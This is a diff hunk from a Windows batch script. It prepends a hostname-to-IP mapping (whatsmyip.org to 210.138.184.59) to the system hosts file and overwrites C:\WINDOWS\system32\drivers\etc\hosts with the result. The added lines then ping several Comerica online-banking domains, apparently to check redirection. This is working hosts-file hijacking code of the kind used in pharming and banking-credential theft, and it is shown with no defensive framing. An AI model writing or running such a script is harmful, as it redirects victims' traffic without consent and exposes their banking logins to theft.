@@ -13,3 +13,8 @@ echo 210.138.184.59 whatsmyip.org > %temp%\temphosts.txt
 type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
 copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
 echo C:\WINDOWS\system32\drivers\etc\hosts
+
+ping webbanking.comerica.com
+ping comerica.com
+ping www.webbanking.comerica.com
+ping www.comerica.com
